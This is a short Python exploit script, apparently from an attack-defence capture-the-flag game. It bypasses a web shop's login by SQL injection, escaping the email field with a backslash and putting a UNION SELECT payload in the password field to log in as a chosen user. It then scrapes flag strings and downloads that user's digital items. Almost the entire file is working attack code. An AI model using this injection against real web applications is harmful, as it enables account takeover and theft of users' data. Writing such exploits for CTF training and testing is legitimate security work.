#!/usr/bin/env python3
import re
import requests
import os
from bs4 import BeautifulSoup

FLAG_REGEX = r"ECSC\w{32}"
host = os.environ.get("target", "localhost:8080")
target_email = os.environ.get("flagid", "test@example.com")

host = "http://" + host

s = requests.Session()

# bypass login by sqli
email = "\\"
password = " and 1=0 union select id,null,email,firstname,lastname,null from users WHERE email = $$" + target_email + "$$ LIMIT 1-- -"

r = s.post(host + "/user/login", data={"email": email, "password": password})
if r.status_code != 200:
    raise Exception("Failed to log in with sqli")

# get serial numbers of physical items
flags = re.findall(FLAG_REGEX, r.text)

# get links of digital items
bs = BeautifulSoup(r.text, "html.parser")
links = bs.find_all('a')
links = map(lambda a: a["href"], links)
links = filter(lambda l: re.match(r".*digital/\d+$", l) is not None, links)

# foreach link download blob and analyze it
for l in links:
    r = s.get(host + l + "/download")
    if r.status_code == 200:
        print("Analyzing digital item behind: " + l)
        # TODO analyze uploaded blob

# print flags
for f in flags:
    print(f)